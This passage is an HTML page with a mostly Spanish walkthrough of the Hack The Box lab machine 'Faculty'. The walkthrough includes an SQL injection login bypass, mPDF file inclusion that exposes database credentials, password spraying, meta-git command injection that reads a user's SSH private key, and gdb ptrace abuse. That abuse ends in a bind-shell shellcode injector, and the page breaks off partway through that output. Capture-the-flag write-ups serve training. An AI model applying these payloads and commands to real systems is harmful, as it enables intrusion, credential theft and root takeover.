@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="h-full">
+   <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Envertex | Faculty</title>
+      <meta name="description" content="Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications. Filter by difficulty, OS, and certification.">
+      <meta name="author" content="Your Name">
+      <meta name="robots" content="index, follow">
+      <!-- OpenGraph -->
+      <meta property="og:type" content="website">
+      <meta property="og:title" content="Envertex Machines">
+      <meta property="og:description" content="Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications.">
+      <meta property="og:url" content="https://envertex.github.io/machines/machines.html">
+      <meta property="og:site_name" content="Envertex Lab">
+      <meta property="og:image" content="https://envertex.github.io/images/profile.png">
+      <meta property="og:image:width" content="1200">
+      <meta property="og:image:height" content="630">
+      <!-- Twitter -->
+      <meta name="twitter:card" content="summary_large_image">
+      <meta name="twitter:title" content="Envertex Machines">
+      <meta name="twitter:description" content="Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications.">
+      <meta name="twitter:image" content="https://envertex.github.io/images/profile.png">
+      <!-- Schema.org JSON-LD -->
+      <script type="application/ld+json">
+         {
+           "@context": "https://schema.org",
+           "@type": "WebPage",
+           "name": "Envertex Machines",
+           "description": "Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications.",
+           "url": "https://envertex.github.io/machines/machines.html",
+           "author": {
+             "@type": "Person",
+             "name": "Your Name",
+             "email": "your.email@example.com"
+           },
+           "publisher": {
+             "@type": "Organization",
+             "name": "Envertex",
+             "logo": {
+               "@type": "ImageObject",
+               "url": "https://envertex.github.io/images/profile.png"
+             }
+           }
+         }
+      </script>
+      <!-- Fonts -->
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+      <!-- CSS -->
+      <link rel="stylesheet" href="/css/theme.min.f1ceb355b0c4c1df17e287a25fb4c6379b07e40c5d26feac7fa2500f0a37cb75.css">
+      <link rel="stylesheet" href="/css/syntax-dark.min.b01037e5609e6260b74d6fcdd6d5131e8dcbc4d46d6ef4bfbe5a60bdfc1a9f30.css" id="syntax-dark-theme" class="syntax-theme">
+      <link rel="stylesheet" href="/css/syntax-light.min.9602bc2fcef52b4c62e05eae14b48ba428e114f116e993e504d83ed5a3aeda98.css" id="syntax-light-theme" class="syntax-theme" disabled>
+      <link rel="stylesheet" href="/css/bundle.min.82559bd59b12235c47e448881d968913485f1bccd9e6c7104066c2e3f1d92bbb.css">
+      <!-- Favicon -->
+      <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/envertex/images/refs/heads/main/favicon.ico">
+      <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/envertex/images/refs/heads/main/favicon.ico">
+      <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/envertex/images/refs/heads/main/favicon.ico">
+      <!-- Theme Switcher -->
+      <script>
+         (function() {
+           const storedTheme = localStorage.getItem('theme');
+           const systemPrefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+           const theme = storedTheme || (systemPrefersLight ? 'light' : 'dark');
+           document.documentElement.setAttribute('data-theme', theme);
+         
+           const syntaxDark = document.getElementById('syntax-dark-theme');
+           const syntaxLight = document.getElementById('syntax-light-theme');
+           if (theme === 'light') { syntaxDark.disabled = true; syntaxLight.disabled = false; } 
+           else { syntaxDark.disabled = false; syntaxLight.disabled = true; }
+         
+           const observer = new MutationObserver(() => {
+             const currentTheme = document.documentElement.getAttribute('data-theme');
+             if (currentTheme === 'light') { syntaxDark.disabled = true; syntaxLight.disabled = false; } 
+             else { syntaxDark.disabled = false; syntaxLight.disabled = true; }
+           });
+           observer.observe(document.documentElement, { attributes: true, attributeFilter: ['data-theme'] });
+         })();
+      </script>
+   </head>
+   <body class="flex flex-col min-h-screen">
+      <a href="#main-content" class="skip-to-main">Skip to main content</a>
+      <!-- Header -->
+      <header class="sticky-header">
+         <div class="header-container">
+            <nav class="header-nav" aria-label="Main navigation">
+               <div class="header-content">
+                  <div class="header-logo">
+                     <a href="/" class="logo-link">✦ Envertex</a>
+                  </div>
+                  <div class="header-menu">
+                     <ul class="menu-list">
+                        <li class="menu-item"><a href="../index.html" class="menu-link">Home</a></li>
+                        <li class="menu-item"><a href="/posts/posts.html" class="menu-link">Posts</a></li>
+                        <li class="menu-item"><a href="/notes/notes.html" class="menu-link">Notes</a></li>
+                        <li class="menu-item"><a href="/machines/machines.html" class="menu-link active">Machines</a></li>
+                        <li class="menu-item"><a href="/about/about.html" class="menu-link">About</a></li>
+                     </ul>
+                     <button id="search-toggle" class="search-toggle" aria-label="Search">
+                        <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                        </svg>
+                     </button>
+                     <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">
+                        <svg class="icon-sun" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
+                        </svg>
+                        <svg class="icon-moon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
+                        </svg>
+                     </button>
+                  </div>
+               </div>
+            </nav>
+         </div>
+      </header>
+      <main id="main-content" class="post-vertex-main" role="main" style="display:flex; gap:2rem; max-width:1200px; margin:0 auto; padding:2rem 1rem;">
+         <!-- TOC lateral fijo -->
+         <aside id="post-toc" class="post-vertex-toc" style="
+            position: sticky;
+            top: calc( var(--header-height, 80px) + 1rem ); /* ajusta según tu header */
+            flex-shrink: 0;
+            width: 250px;
+            align-self: flex-start;
+            ">
+            <h2 class="post-vertex-toc-title">Contents</h2>
+            <nav class="post-vertex-toc-nav">
+               <ul>
+                  <!-- Se llenará automáticamente -->
+               </ul>
+            </nav>
+         </aside>
+         <!-- Main content -->
+         <article class="post-vertex-article" style="flex:1; min-width:0;">
+            <header class="post-vertex-header">
+               <h1 class="post-vertex-title">
+                  Faculty
+               </h1>
+               <div class="post-vertex-meta">
+                  <span class="post-vertex-reading" datetime="2026-01-06">
+                  </span>
+               </div>
+               <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/main.png"/>
+            </header>
+            <div class="post-vertex-content">
+
+<h2 id="general-information">
+   General Information
+</h2>
+
+<p>
+   This section summarizes the basic context of the target machine, including relevant technical details that help understand the environment before starting the enumeration and exploitation process.
+</p>
+
+<ul>
+   <li><strong>IP:</strong> 10.129.227.208</li>
+   <li><strong>Operating System:</strong> Linux (Hack The Box)</li>
+   <li><strong>Exposed Services:</strong> HTTP (Web Service), SSH (Restricted)</li>
+   <li><strong>Attack Vector:</strong> Web Application</li>
+</ul>
+
+<p>
+   The target machine exposes a publicly accessible web service alongside a restricted SSH service, suggesting a classic attack flow focused on web enumeration, application-level exploitation, and privilege escalation through insecure system configurations.
+</p>
+
+<p>
+   During the compromise, multiple chained vulnerabilities were identified, including an SQL injection leading to administrative access, a known mPDF vulnerability enabling Local File Inclusion (LFI), exposure of reusable credentials, lateral movement between users, and a critical privilege escalation via misconfigured Linux capabilities associated with <code>gdb</code>.
+</p>
+
+<h2 id="enumeraci-n">
+ Enumeraci&oacute;n
+</h2>
+<h3 id="escaneo-de-puertos-y-servicios">
+ Escaneo de puertos y servicios
+</h3>
+<p>
+ La fase inicial consiste en identificar la superficie de ataque expuesta por el sistema. Para ello se realiza un escaneo TCP completo utilizando
+ <code>
+  nmap
+ </code>
+ , priorizando velocidad y detecci&oacute;n de puertos abiertos sin resoluci&oacute;n DNS.
+</p>
+<pre><code class="lang-bash">sudo nmap -p- -sS -Pn -n --open --min-rate <span class="hljs-number">6500</span> --max-retries <span class="hljs-number">1</span> --initial-rtt-timeout <span class="hljs-number">100</span>ms --max-rtt-timeout <span class="hljs-number">300</span>ms -T4 <span class="hljs-number">10.129</span><span class="hljs-number">.227</span><span class="hljs-number">.208</span> -oG allPortsTCP
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img1.png"/>
+</p>
+<p>
+ El escaneo revela &uacute;nicamente los puertos 22 (SSH) y 80 (HTTP) abiertos. Con esta informaci&oacute;n se procede a un escaneo m&aacute;s detallado de versiones y scripts por defecto.
+</p>
+<pre><code class="lang-bash">nmap -p22,<span class="hljs-number">80</span> -sCV <span class="hljs-number">10.129</span><span class="hljs-number">.227</span><span class="hljs-number">.208</span> -oN infoPortsTCP
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img2.png"/>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img3.png"/>
+</p>
+<p>
+ El servicio HTTP aloja un sitio web relacionado con una plataforma acad&eacute;mica, mientras que SSH parece restringido a usuarios internos, descartando acceso directo por este vector en esta etapa.
+</p>
+<h3 id="enumeraci-n-web-y-directorios">
+ Enumeraci&oacute;n web y directorios
+</h3>
+<p>
+ Al interactuar con el sitio web, se identifica un formulario de autenticaci&oacute;n que solicita un identificador num&eacute;rico, lo cual resulta at&iacute;pico y sugiere una validaci&oacute;n deficiente del lado del servidor. Para ampliar la superficie de ataque, se realiza una enumeraci&oacute;n de directorios usando
+ <code>
+  gobuster
+ </code>
+ .
+</p>
+<pre><code class="lang-bash"><span class="hljs-string">gobuster </span><span class="hljs-string">dir </span>-u <span class="hljs-string">http:</span>//<span class="hljs-string">faculty.</span><span class="hljs-string">htb/</span> -w /<span class="hljs-string">usr/</span><span class="hljs-string">share/</span><span class="hljs-string">SecLists/</span><span class="hljs-string">Discovery/</span><span class="hljs-string">Web-Content/</span><span class="hljs-string">DirBuster-2007_directory-</span><span class="hljs-built_in">list-lowercase-2.3-medium.txt</span> -x <span class="hljs-string">'php'</span> -t <span class="hljs-string">200</span>
+</code></pre>
+<p>
+ El escaneo revela la existencia del directorio
+ <code>
+  /admin
+ </code>
+ , el cual resulta especialmente interesante por su potencial impacto.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img4.png"/>
+</p>
+<p>
+ Al acceder a este directorio, el servidor redirige autom&aacute;ticamente a
+ <code>
+  /admin/login.php
+ </code>
+ , confirmando la presencia de un panel administrativo protegido &uacute;nicamente por autenticaci&oacute;n web.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img5.png"/>
+</p>
+<h3 id="tecnolog-as-y-archivos-expuestos">
+ Tecnolog&iacute;as y archivos expuestos
+</h3>
+<p>
+ El formulario de autenticaci&oacute;n administrativa no implementa controles de sanitizaci&oacute;n adecuados. Al probar un payload b&aacute;sico de inyecci&oacute;n SQL en los campos de usuario y contrase&ntilde;a, se confirma la vulnerabilidad.
+</p>
+<p>
+ El payload utilizado es el siguiente:
+</p>
+<pre><code><span class="hljs-number">1</span>' or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>-- -
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img6.png"/>
+</p>
+<p>
+ Como resultado, se obtiene acceso exitoso al panel administrativo sin credenciales v&aacute;lidas, confirmando una inyecci&oacute;n SQL cl&aacute;sica basada en l&oacute;gica booleana.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img7.png"/>
+</p>
+<p>
+ Dentro del panel, no se identifican funcionalidades administrativas relevantes de forma inmediata. Sin embargo, destaca un bot&oacute;n de descarga que permite obtener un archivo PDF generado din&aacute;micamente.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img8.png"/>
+</p>
+<h2 id="explotaci-n">
+ Explotaci&oacute;n
+</h2>
+<h3 id="identificaci-n-de-la-vulnerabilidad">
+ Identificaci&oacute;n de la vulnerabilidad
+</h3>
+<p>
+ El archivo PDF descargado resulta ser generado mediante la librer&iacute;a
+ <code>
+  mPDF
+ </code>
+ . Para validar esta hip&oacute;tesis, se analizan sus metadatos utilizando
+ <code>
+  exiftool
+ </code>
+ .
+</p>
+<pre><code class="lang-bash"><span class="hljs-selector-tag">exiftool</span> <span class="hljs-selector-tag">OKrZOgahdDp1PR9lJcM82NWtiw</span><span class="hljs-selector-class">.pdf</span>
+</code></pre>
+<p>
+ La salida confirma el uso de
+ <code>
+  mPDF 6.0
+ </code>
+ , una versi&oacute;n conocida por contener m&uacute;ltiples vulnerabilidades documentadas p&uacute;blicamente.
+</p>
+<p>
+ Esta informaci&oacute;n es cr&iacute;tica, ya que permite buscar exploits espec&iacute;ficos asociados a esta versi&oacute;n de la librer&iacute;a.
+</p>
+<h3 id="ejecuci-n-remota-de-comandos">
+ Ejecuci&oacute;n remota de comandos
+</h3>
+<p>
+ Al consultar la base de datos de exploits mediante
+ <code>
+  searchsploit
+ </code>
+ , se identifica una vulnerabilidad que permite realizar Local File Inclusion (LFI) a trav&eacute;s de mPDF.
+</p>
+<pre><code class="lang-bash"><span class="hljs-attribute">searchsploit mpdf</span>
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img9.png"/>
+</p>
+<p>
+ Se descarga el exploit correspondiente y se ejecuta para generar un payload malicioso.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img10.png"/>
+</p>
+<p>
+ El payload generado se inyecta interceptando la solicitud HTTP con Burp Suite, espec&iacute;ficamente en el par&aacute;metro
+ <code>
+  pdf
+ </code>
+ .
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img11.png"/>
+</p>
+<p>
+ Al abrir el documento PDF resultante, este aparece aparentemente en blanco. Sin embargo, al observar la esquina superior izquierda, se detecta una alerta indicando la presencia de un archivo adjunto.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img12.png"/>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img13.png"/>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img14.png"/>
+</p>
+<p>
+ Al descargar y abrir el archivo adjunto, se confirma que el LFI es exitoso y permite leer archivos arbitrarios del sistema.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img15.png"/>
+</p>
+<h3 id="obtenci-n-de-acceso-interactivo">
+ Obtenci&oacute;n de acceso interactivo
+</h3>
+<p>
+ Aprovechando el LFI, se extrae el archivo
+ <code>
+  login.php
+ </code>
+ , el cual revela una dependencia directa hacia
+ <code>
+  db_connect.php
+ </code>
+ , donde se almacenan las credenciales de conexi&oacute;n a la base de datos.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img16.png"/>
+</p>
+<p>
+ Se repite el proceso con dicho archivo, generando un nuevo payload.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img17.png"/>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img18.png"/>
+ Como resultado, se obtienen credenciales v&aacute;lidas:
+</p>
+<pre><code>sched:Co<span class="hljs-selector-class">.met06aci</span><span class="hljs-selector-class">.dly53ro</span><span class="hljs-selector-class">.per</span>
+</code></pre>
+<p>
+ Estas credenciales no funcionan directamente v&iacute;a SSH, pero al enumerar usuarios mediante
+ <code>
+  /etc/passwd
+ </code>
+ , se obtiene una lista potencial de cuentas v&aacute;lidas. Se procede entonces a realizar password spraying.
+</p>
+<pre><code class="lang-bash"><span class="hljs-attribute">nxc</span> ssh <span class="hljs-number">10.129.227.208</span> -u users -p <span class="hljs-string">'Co.met06aci.dly53ro.per'</span> --continue-<span class="hljs-literal">on</span>-success
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img19.png"/>
+</p>
+<p>
+ El ataque resulta exitoso para el usuario
+ <code>
+  gbyolo
+ </code>
+ .
+</p>
+<pre><code>gbyolo:Co<span class="hljs-selector-class">.met06aci</span><span class="hljs-selector-class">.dly53ro</span><span class="hljs-selector-class">.per</span>
+</code></pre>
+<h2 id="subida-de-privilegios">
+ Subida de privilegios
+</h2>
+<h3 id="enumeraci-n-de-vectores-de-escalada">
+ Enumeraci&oacute;n de vectores de escalada
+</h3>
+<p>
+ Una vez dentro del sistema como
+ <code>
+  gbyolo
+ </code>
+ , se enumeran los permisos sudo disponibles.
+</p>
+<pre><code class="lang-bash">sudo <span class="hljs-_">-l</span>
+</code></pre>
+<p>
+ El usuario puede ejecutar
+ <code>
+  /usr/local/bin/meta-git
+ </code>
+ como el usuario
+ <code>
+  developer
+ </code>
+ . Esto representa una v&iacute;a clara de movimiento lateral.
+</p>
+<p>
+ Se identifica la versi&oacute;n instalada de
+ <code>
+  meta-git
+ </code>
+ .
+</p>
+<pre><code class="lang-bash">npm <span class="hljs-keyword">list</span> -g | <span class="hljs-keyword">grep</span> meta-git
+</code></pre>
+<p>
+ La versi&oacute;n
+ <code>
+  1.1.2
+ </code>
+ presenta una vulnerabilidad documentada p&uacute;blicamente que permite inyecci&oacute;n de comandos.
+</p>
+<h3 id="an-lisis-de-la-vulnerabilidad">
+ An&aacute;lisis de la vulnerabilidad
+</h3>
+<p>
+ El exploit se basa en el uso de caracteres especiales al clonar repositorios, permitiendo ejecutar comandos arbitrarios en el contexto del usuario objetivo.
+</p>
+<pre><code class="lang-bash">sudo -u developer /usr/local/bin/<span class="hljs-keyword">meta</span>-git <span class="hljs-keyword">clone</span> <span class="hljs-title">'sss</span>||whoami'
+</code></pre>
+<p>
+ La salida confirma la ejecuci&oacute;n del comando bajo el usuario
+ <code>
+  developer
+ </code>
+ .
+</p>
+<p>
+ Posteriormente, se utiliza esta t&eacute;cnica para extraer la clave privada SSH del usuario
+ <code>
+  developer
+ </code>
+ .
+</p>
+<pre><code class="lang-bash">sudo -u developer /usr/local/bin/<span class="hljs-keyword">meta</span>-git <span class="hljs-keyword">clone</span> <span class="hljs-title">'sss</span>||cat /home/developer/.ssh/id_rsa'
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img20.png"/>
+</p>
+<p>
+ Con la clave obtenida, se establece una sesi&oacute;n SSH como
+ <code>
+  developer
+ </code>
+ .
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img21.png"/>
+</p>
+<p>
+ Se obtiene la flag de usuario.
+</p>
+<pre><code class="lang-bash"><span class="hljs-selector-tag">cat</span> <span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.txt</span>
+</code></pre>
+<h3 id="explotaci-n-y-obtenci-n-de-root">
+ Explotaci&oacute;n y obtenci&oacute;n de root
+</h3>
+<p>
+ Durante la enumeraci&oacute;n avanzada, se identifican capacidades peligrosas asignadas a binarios del sistema.
+</p>
+<pre><code class="lang-bash">getcap -r <span class="hljs-regexp">/ 2&gt;/</span>dev/<span class="hljs-literal">null</span>
+</code></pre>
+<p>
+ Destaca especialmente
+ <code>
+  /usr/bin/gdb
+ </code>
+ con la capacidad
+ <code>
+  cap_sys_ptrace+ep
+ </code>
+ , lo que permite adjuntarse a procesos ejecutados como root.
+</p>
+<p>
+ Se identifican procesos root activos en Python.
+</p>
+<pre><code class="lang-bash"><span class="hljs-keyword">ps</span> -aux | <span class="hljs-keyword">grep</span> <span class="hljs-string">'root'</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">'python'</span>
+</code></pre>
+<p>
+ Se adjunta
+ <code>
+  gdb
+ </code>
+ a uno de estos procesos.
+</p>
+<pre><code class="lang-bash">gdb -<span class="hljs-selector-tag">p</span> <span class="hljs-number">691</span>
+</code></pre>
+<p>
+ Dentro de
+ <code>
+  gdb
+ </code>
+ , se ejecuta:
+</p>
+<pre><code class="lang-gdb">call (<span class="hljs-name">void</span>)system(<span class="hljs-string">"chmod u+s /bin/bash"</span>)
+</code></pre>
+<p>
+ Tras salir, se lanza una shell privilegiada.
+</p>
+<pre><code class="lang-bash">/bin/bash -<span class="hljs-selector-tag">p</span>
+whoami
+</code></pre>
+<p>
+ El acceso root es exitoso.
+</p>
+
+
+
+
+
+
+
+
+<h3 id="escalada-alternativa-mediante-abuso-de-gdb-y-bind-shell">Escalada alternativa mediante abuso de GDB y bind shell</h3>
+<p>En caso de que la primera técnica de escalada falle (por ejemplo, si no es posible modificar permisos de binarios o el proceso objetivo termina), es posible recurrir a una técnica más robusta basada en <strong>inyección de shellcode en memoria mediante GDB</strong>, aprovechando la capacidad <code>CAP_SYS_PTRACE</code>.</p>
+<p>El objetivo es <strong>inyectar shellcode en un proceso que se esté ejecutando como root</strong> y forzar la creación de una <strong>bind shell</strong> accesible localmente.</p>
+<h4 id="identificaci-n-de-procesos-ejecut-ndose-como-root">Identificación de procesos ejecutándose como root</h4>
+<p>Primero se listan los procesos activos cuyo propietario sea <code>root</code>, buscando uno estable y de larga duración.</p>
+<pre><code class="lang-bash"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> <span class="hljs-string">'^root'</span>
+</code></pre>
+<p>Entre los procesos listados se identifica, por ejemplo:</p>
+<pre><code>root        <span class="hljs-number">1556</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.2</span>  <span class="hljs-number">38072</span>  <span class="hljs-number">4472</span> ?        Ss   <span class="hljs-number">16</span>:<span class="hljs-number">15</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">postfix</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">master</span> -<span class="hljs-title">w</span></span>
+</code></pre>
+<p>El proceso <code>postfix master</code> resulta adecuado, ya que:</p>
+<ul>
+   <li>Se ejecuta como root</li>
+   <li>Es persistente</li>
+   <li>No finaliza tras un corto periodo de tiempo</li>
+</ul>
+<h4 id="adjuntarse-al-proceso-root-con-gdb">Adjuntarse al proceso root con GDB</h4>
+<p>Se utiliza <code>gdb</code> para adjuntarse directamente al proceso identificado.</p>
+<pre><code class="lang-bash">gdb -<span class="hljs-selector-tag">q</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1556</span>
+</code></pre>
+<p>Si el adjunto es exitoso, se observa una salida similar a la siguiente:</p>
+<pre><code><span class="hljs-number">0x00007f9b18b11c3a</span> in _start () from /lib64/ld-linux-x86<span class="hljs-number">-64.</span>so<span class="hljs-number">.2</span>
+(gdb)
+</code></pre>
+<p>Esta salida confirma que:</p>
+<ul>
+   <li>GDB logró adjuntarse al proceso</li>
+   <li>Se tiene control sobre la ejecución</li>
+   <li>La capacidad <code>CAP_SYS_PTRACE</code> está funcionando correctamente</li>
+</ul>
+<h4 id="preparaci-n-del-shellcode-m-quina-atacante-">Preparación del shellcode (máquina atacante)</h4>
+<p>Para esta técnica se utiliza un exploit público que permite generar instrucciones compatibles con GDB para escribir shellcode directamente en memoria.</p>
+<p>Exploit original:
+   <a href="https://www.exploit-db.com/exploits/41128">https://www.exploit-db.com/exploits/41128</a>
+</p>
+<p>El siguiente script genera los comandos <code>set {long}</code> necesarios para inyectar un <strong>bind shell</strong> en el puerto 5600.</p>
+<pre><code class="lang-python">#!/usr/bin/env python3
+
+buf = b"<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>f6<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>c6<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>29<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>5f<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>c7<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>32<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>2b<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ce<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>21<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>f8<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>e6<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>05"
+
+buf = b"<span class="hljs-symbol">\x</span>90" * (16 - (len(buf) <span class="hljs-variable">% 8)) + buf
+
+for i in range(0, len(buf), 8):
+    chunk = buf[i:i+8][::-1]
+    print(f"set {{long}}($rip+{i}) = 0x" + ''.join(f'{b:02x}' for b in chunk))</span>
+</code></pre>
+<p>Se ejecuta el script desde la máquina atacante:</p>
+<pre><code class="lang-bash"><span class="hljs-keyword">python3</span> gdb_abuse.<span class="hljs-keyword">py</span>
+</code></pre>
+<p>El resultado es una serie de instrucciones listas para pegar dentro de GDB, por ejemplo:</p>
+<pre><code><span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">0</span>) = <span class="hljs-number">0x9090909090909090</span>
+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">8</span>) = <span class="hljs-number">0x48d23148c0314890</span>
+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">16</span>) = <span class="hljs-number">0x6a58296ac6fff631</span>
+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">24</span>) = <span class="hljs-number">0x026a9748050f5f02</span>
+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">32</span>) = <span class="hljs-number">0x54e015022444c766</span>
+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">40</span>) = <span class="hljs-number">0x5a106a58316a525e</span>
+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">48</span>) = <span class="hljs-number">0x050f58326a5e050f</span>
